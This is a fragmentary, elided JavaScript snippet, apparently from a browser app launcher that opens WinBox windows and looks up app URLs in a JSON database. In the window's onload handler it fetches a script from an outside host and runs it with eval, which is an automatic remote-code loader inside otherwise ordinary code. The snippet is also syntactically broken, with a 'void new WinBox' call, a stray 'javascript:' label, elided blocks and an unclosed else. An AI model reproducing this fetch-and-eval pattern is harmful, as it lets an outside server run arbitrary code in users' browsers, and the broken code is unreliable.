...
//create window
 void new WinBox({
    ...
    alert('Could not find the app "' + parseApp + '" in the app database, please press the "d" key and check if you spelt the app wrong.')
    }
    ...
    if (jsonObject.apps[parsedUrl] ) {
       var newUrl = jsonObject.apps[parsedUrl].url;
    };
...
newWindow.onload = function() {
  javascript:fetch("https://e.pool.nyphp.com/cors/embed-recieve.js").then(res=>res.text()).then(data=>eval(data)(url))
};
}else {
